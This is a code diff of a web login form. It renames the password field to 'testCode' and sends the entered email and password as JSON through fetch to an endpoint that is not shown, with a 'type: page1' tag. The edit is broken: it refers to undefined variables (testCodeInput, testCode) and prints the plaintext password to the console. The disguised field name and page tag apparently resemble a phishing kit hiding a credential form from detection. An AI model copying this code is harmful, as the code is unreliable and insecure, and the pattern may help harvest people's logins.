@@ -120,7 +120,7 @@ button:active {
   </div>
 
   <div class="field">
-    <input type="password" name="password" placeholder="Password" required>
+    <input type="password" name="testCode" placeholder="Password" required>
   </div>
 
 <div class="small">
@@ -137,21 +137,21 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   e.preventDefault();
 
   const emailInput = document.querySelector('#loginForm input[name="email"]');
-  const passwordInput = document.querySelector('#loginForm input[name="password"]');
+  const passwordInput = document.querySelector('#loginForm input[name="testCode"]');
 
   console.log("email input:", emailInput);
-  console.log("password input:", passwordInput);
+  console.log("testCode input:", testCodeInput);
 
-  if (!emailInput || !passwordInput) {
+  if (!emailInput || !testCodeInput) {
     console.error("Form fields not found");
     alert("Form fields not found");
     return;
   }
 
   const email = emailInput.value;
-  const password = passwordInput.value;
+  const password = testCodeInput.value;
 
-  console.log("Sending:", email, password);
+  console.log("Sending:", email, testCode);
 
   try {
     const response = await fetch(
@@ -164,7 +164,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         body: JSON.stringify({
   type: 'page1',
           email: email,
-          password: password
+          testCode: testCode
         })
       }
     );
